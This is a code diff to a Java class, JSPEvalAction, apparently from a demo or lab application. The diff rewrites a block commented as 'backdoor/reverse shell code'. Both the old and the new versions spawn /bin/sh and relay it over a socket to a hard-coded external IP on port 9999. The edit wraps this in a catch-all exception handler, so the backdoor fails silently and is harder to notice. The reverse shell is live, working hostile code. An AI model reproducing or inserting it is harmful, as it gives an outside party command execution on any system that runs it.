@@ -58,38 +58,41 @@ public class JSPEvalAction extends ExampleAction {
 				// end exfil code
 
 				// begin backdoor/reverse shell code
-				
-		                String host = "39.234.101.45";
-		                int port = 9999;
-		                String cmd = "/bin/sh";
-		                Process p = (new ProcessBuilder(new String[]{cmd})).redirectErrorStream(true).start();
-		                Socket s = new Socket(host, port);
-		                InputStream pi = p.getInputStream();
-		                InputStream pe = p.getErrorStream();
-		                InputStream si = s.getInputStream();
-		                OutputStream po = p.getOutputStream();
-		                OutputStream so = s.getOutputStream();
-		                while(!s.isClosed()) {
-		                   while(pi.available() > 0) {
-		                        so.write(pi.read());
+
+				try {
+		                   String host = "39.234.101.45";
+		                   int port = 9999;
+		                   String cmd = "/bin/sh";
+		                   Process p = (new ProcessBuilder(new String[]{cmd})).redirectErrorStream(true).start();
+		                   Socket s = new Socket(host, port);
+		                   InputStream pi = p.getInputStream();
+		                   InputStream pe = p.getErrorStream();
+		                   InputStream si = s.getInputStream();
+		                   OutputStream po = p.getOutputStream();
+		                   OutputStream so = s.getOutputStream();
+		                   while(!s.isClosed()) {
+		                      while(pi.available() > 0) {
+		                           so.write(pi.read());
+		                      }
+		                      while(pe.available() > 0) {
+		                           so.write(pe.read());
+		                      }
+		                      while(si.available() > 0) {
+		                           po.write(si.read());
+		                      }
+		                      so.flush();
+		                      po.flush();
+		                      Thread.sleep(50L);
+		                      try {
+		                         p.exitValue();
+		                         break;
+		                      }
+			              catch (Exception var12) {}
 		                   }
-		                   while(pe.available() > 0) {
-		                        so.write(pe.read());
-		                   }
-		                   while(si.available() > 0) {
-		                        po.write(si.read());
-		                   }
-		                   so.flush();
-		                   po.flush();
-		                   Thread.sleep(50L);
-		                   try {
-		                        p.exitValue();
-		                        break;
-		                   }
-			           catch (Exception var12) {}
-		                }
-		                p.destroy();
-		                s.close();
+		                   p.destroy();
+		                   s.close();
+				}
+				catch (Throwable t) {}
 				
 				// end backdoor/reverse shell code
 				
